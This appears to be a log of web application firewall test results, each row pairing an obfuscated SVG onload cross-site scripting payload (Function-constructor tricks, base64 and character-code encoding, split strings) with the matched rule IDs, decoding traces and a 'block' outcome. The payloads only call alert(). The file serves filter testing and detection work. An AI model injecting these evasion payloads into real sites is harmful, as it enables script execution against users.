2924,"<svg onload='(new(window.top.Function)(""retur""+""n aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,53v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009620.376802
2925,"<svg onload='(new(parent.Function)(""ret""+""urn al""+""ert""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,49v217,64t:urlDecode,t:replaceComments,t:compressWhitespace || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827009983.587596
2926,"<svg onload='(new[0,Function][1](""retur""+""n ale""+""rt""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o29,31v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827010197.435178
2929,"<svg onload='(new(Function[""constructor""])(""re""+""turn aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,57v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827010848.637398
2937,"<svg onload='(new(globalThis.Function)(""ret""+""urn aler""+""t""))()(1)'>",0,1,block,5,"933210,941100,941120,941160,949110","o13,53v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827012665.185950
2980,"<svg onload='parent[""Function""](atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o19,44v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827022622.756323
2982,"<svg onload='self[""Function""][""prototype""][""constructor""][""prototype""][""constructor""](atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o17,100v217,125t:urlDecode,t:replaceComments,t:compressWhitespace || v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,125t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v217,125t:urlDecodeUni,t:compressWhitespace || ",25,177827023052.256086
2991,<svg onload='top.Function(atob`d2luZG93LmFsZXJ0KDEp`)()'></svg>,0,1,block,4,"941100,941120,941160,949110","v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827025292.866853
3004,"<svg onload='new/**/Function/**/(String.fromCharCode(97,108,101,114,116,40,49,41))()' />",0,1,block,5,"934100,941100,941120,941160,949110","o33,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827028364.494384
3039,"<svg onload='globalThis.Function(""ale""+""rt(17)"")()'>",0,1,block,4,"941100,941120,941160,949110","v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,52t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782703654.390887
3063,"<svg onload=""(this)['Function']||[]['flat']['constructor']('\x61lert(3)')()"">",0,1,block,6,"933210,941100,941120,941160,941370,949110","o33,42v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,17v217,77t:urlDecodeUni,t:compressWhitespace || ",25,177827042259.419511
3103,"<svg onload='(1,top[""Function""])(""var a=atob(\""YWxlcnQoMSk=\"");eval(a);"")()'></svg>",0,1,block,9,"932100,933160,933210,934100,941100,941120,941160,941370,949110","o62,5v217,83 || o63,12v217,83 || o19,56v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || o63,5v217,83 || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,15v217,83t:urlDecodeUni,t:compressWhitespace || ",40,177827051514.618562
3105,"<svg onload='Reflect[""construct""](Function,[""var a=atob(\""YWxlcnQoMSk=\"");eval(a);""])()'></svg>",0,1,block,8,"932100,933160,933210,934100,941100,941120,941160,949110","o73,5v217,95 || o74,13v217,95 || o20,67v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || o74,5v217,95 || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17782705204.769127
3130,"<svg onload='parent[""co""+""nstr""+""uctor""][""co""+""nstr""+""uctor""](""aler""+""t(1)"")()'></svg>",0,1,block,5,"933210,941100,941120,941160,949110","o19,59v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827058052.197092
3149,"<svg onload='top.Function(String.fromCharCode(97,108,101,114,116,40,50,56,41))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o26,19v217,88 || v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,88t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827062534.742163
3174,"<svg onload='(top)[""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o13,41v217,56t:urlDecode,t:replaceComments,t:compressWhitespace || v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o14,16v217,56t:urlDecodeUni,t:compressWhitespace || ",25,177827068353.635415
3178,"<svg onload='Reflect.construct(Function,[atob(""YWxlcnQoMjQp"")])()'>",0,1,block,4,"941100,941120,941160,949110","v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827069288.761041
3180,"<svg onload='document[""defaultView""][""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o21,51v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,23v217,74t:urlDecodeUni,t:compressWhitespace || ",25,177827069772.722967
3185,"<svg onload='(1,window[""Function""])(atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o22,37v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,18v217,61t:urlDecodeUni,t:compressWhitespace || ",25,177827070975.766604
3187,"<svg onload='top[""Function""][""prototype""][""constructor""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,64v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v217,82t:urlDecodeUni,t:compressWhitespace || ",25,177827071368.991791
3191,"<svg onload='(false||window)[""Function""](atob(""YWxlcnQoMjQp""))()'>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o28,36v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,19v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177827072373.342649
3192,"<svg onload='with(window)Function(atob(""YWxlcnQoMjQp""))()'>",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782707250.962354
3193,"<svg onload='(function(){return(this[""Function""])(atob(""YWxlcnQoMjQp""))})()()'>",0,1,block,7,"933210,934100,941100,941120,941160,941370,949110","o13,64v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,79 || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,16v217,79t:urlDecodeUni,t:compressWhitespace || ",30,177827072899.412120
3205,"<svg onload='(function(){return arguments.callee.caller.constructor(atob(""d2luZG93LmFsZXJ0KDEp""))})()();'></svg>",0,1,block,6,"933210,934100,941100,941120,941160,949110","o13,90v217,112t:urlDecode,t:replaceComments,t:compressWhitespace || o14,11v217,112 || v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,112t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17782707567.038289
3210,"<svg onload='AsyncFunction=Object.getPrototypeOf(async function(){}).constructor;AsyncFunction(atob(""d2luZG93LmFsZXJ0KDEp""))()'></svg>",0,1,block,5,"934100,941100,941120,941160,949110","o55,11v217,134 || v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,134t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827076792.193536
3245,"<svg onload='this.remove();Function?.(""/*comment*/\141\154\145\162\164(1)"")()'/>",0,1,block,4,"941100,941120,941160,949110","v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827085180.723549
3247,"<svg onload='this.remove();[1].map(function(){return(this[(""con""+""structor"")][""constructor""](""a""+""lert(1)""))}).pop()()'>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o27,91v217,120t:urlDecode,t:replaceComments,t:compressWhitespace || o35,11v217,120 || o35,11v217,120t:urlDecodeUni || v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,120t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o53,24v217,120t:urlDecodeUni,t:compressWhitespace || ",35,177827085524.998776
3279,<svg onload=(top)['Function']('al'+'ert(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o12,34v216,47t:urlDecode,t:replaceComments,t:compressWhitespace || v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,47t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v216,47t:urlDecodeUni,t:compressWhitespace || ",25,177827093131.266473
3291,<svg onload=parent['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o18,29v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17782709613.318386
3292,<svg onload=frames['Function']('al'+'ert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o18,29v216,48t:urlDecode,t:replaceComments,t:compressWhitespace || v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,48t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827096330.492251
3349,<svg onload=with(window)Function('aler'+'t(1)')()>,0,1,block,4,"941100,941120,941160,949110","v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,50t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827109863.461898
3357,<svg onload=top['Function'](['ale'+'rt(1)'].join())()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o15,38v217,54t:urlDecode,t:replaceComments,t:compressWhitespace || v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v217,54t:urlDecodeUni,t:compressWhitespace || ",25,177827111716.100564
3379,"<svg onload=Function['prototype']['call']['call'](window['ev'+'al'],this,atob('YWxlcnQoMSk='))>",0,1,block,6,"933210,941100,941120,941160,941370,949110","o20,74v217,95t:urlDecode,t:replaceComments,t:compressWhitespace || v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o50,17v217,95t:urlDecodeUni,t:compressWhitespace || ",25,177827116932.724483
3386,"<svg onload=Reflect['construct'](Function,[atob('YWxlcnQoMSk=')])()>",0,1,block,5,"933210,941100,941120,941160,949110","o19,48v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827118581.356003
3415,"<svg onload=(function(){this[String['from'+'CharCode'](97,108,101,114,116)]('XSS')})()>",0,1,block,8,"933210,934100,934100,941100,941120,941160,941370,949110","o12,74v217,87t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,87 || o13,11v217,87t:urlDecodeUni || v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,30v217,87t:urlDecodeUni,t:compressWhitespace || ",35,177827125415.341449
3417,<svg onload=(function(){({}['constr\x75ctor']['constr\x75ctor']('return\x20this')())['al'+'ert']('XSS')})()>,0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o12,95v217,108t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,108 || o13,11v217,108t:urlDecodeUni || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177827125925.318349
3419,<svg onload=(function(){[]['constr\x75ctor']['constr\x75ctor']('al'+'ert(1)')()})()>,0,1,block,7,"933210,934100,934100,941100,941120,941160,949110","o62,21v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || o13,11v217,84 || o13,11v217,84t:urlDecodeUni || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,177827126424.229599
3423,<svg onload=(function(){document['default'+'View']['ev\x61l']('al'+'ert(1)')})()>,0,1,block,7,"934100,934100,941100,941120,941160,941370,949110","o13,11v217,81 || o13,11v217,81t:urlDecodeUni || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,26v217,81t:urlDecodeUni,t:compressWhitespace || ",30,17782712744.948699
3429,<svg onload=(function(){self['ev\x61l'](atob('YWxlcnQoMSk='))})()>,0,1,block,6,"934100,941100,941120,941160,941370,949110","o13,11v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,66t:urlDecodeUni,t:compressWhitespace || ",25,177827128981.841267
3446,<svg onload=self['Function']('al'+'ert(1)')()>,0,1,block,6,"933210,941100,941120,941160,941370,949110","o16,29v216,46t:urlDecode,t:replaceComments,t:compressWhitespace || v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,46t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v216,46t:urlDecodeUni,t:compressWhitespace || ",25,177827132950.876789
3479,<svg onload=parent['Function']['constru'+'ctor']('retur'+'n\x20ale'+'rt')()('1')>,0,1,block,5,"933210,941100,941120,941160,949110","o18,62v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827140854.327706
3482,<svg onload=Function['prototype']['constructor']('a'+'lert(1)')()>,0,1,block,5,"933210,941100,941120,941160,949110","o20,45v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827141512.954921
3583,"<svg onload=top.Function.call(null,atob('YWxlcnQoMSk='))()>",0,1,block,4,"941100,941120,941160,949110","v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177827165792.212168
3606,<svg onload=globalThis['Function'](atob('YWxlcnQoMSk='))()>,0,1,block,5,"933210,941100,941120,941160,949110","o22,36v216,59t:urlDecode,t:replaceComments,t:compressWhitespace || v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o4,8v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,12v216,59t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177827171252.851368
3641,"<svg><animate onbegin=""this.onbegin=null;(top['Function'])('ale'+'rt(22)')()""></animate></svg>",0,1,block,7,"932105,933210,941100,941120,941160,941370,949110","o40,5v217,94 || o41,35v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,15v217,94t:urlDecodeUni,t:compressWhitespace || ",30,177827179611.171434
3656,"<svg><animate onbegin=""this.onbegin=null;(function(){})['constructor']('ale'+'rt(22)')()""></animate></svg>",0,1,block,8,"932100,933210,934100,934100,941100,941120,941160,949110","o40,10v217,106 || o41,47v217,106t:urlDecode,t:replaceComments,t:compressWhitespace || o42,11v217,106 || o42,11v217,106t:urlDecodeUni || v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,9v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,22v217,106t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,17782718322.381755
